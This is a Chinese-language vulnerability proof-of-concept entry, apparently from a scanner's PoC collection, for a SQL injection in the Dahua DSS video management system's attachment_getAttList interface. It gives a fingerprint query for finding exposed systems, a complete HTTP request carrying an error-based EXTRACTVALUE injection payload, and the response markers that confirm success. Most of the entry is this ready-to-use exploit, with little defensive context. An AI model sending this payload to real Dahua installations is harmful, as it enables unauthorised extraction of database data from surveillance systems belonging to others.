﻿# 大华DSS视频管理系统sql注入漏洞

> 更新时间：2024-02-20

> 漏洞编号：

> 漏洞说明：大华DSS数字监控系统attachment_getAttList接口存在SQL注入漏洞，攻击者可以利用该漏洞获取数据库敏感信息。

> 漏洞特征：指纹 hunter：app.name="Dahua大华 DSS 视频管理系统"

> 验证脚本：HTTP

```
GET /portal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：XPATH syntax

> 上传文件定位：


> 验证文件来源：大华DSS视频管理系统sql注入漏洞.poc
